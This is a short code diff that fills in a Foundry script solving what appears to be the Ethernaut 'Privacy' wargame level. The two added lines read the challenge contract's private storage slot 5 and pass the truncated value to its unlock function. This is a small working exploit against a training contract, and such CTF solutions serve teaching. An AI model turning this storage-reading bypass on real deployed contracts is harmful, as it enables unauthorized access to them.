@@ -16,7 +16,8 @@ contract PrivacySolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
+        bytes32 key = vm.load(challengeInstance, bytes32(uint256(5)));
+        challengeInstance.call(abi.encodeWithSignature("unlock(bytes16)", bytes16(key)));
 
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
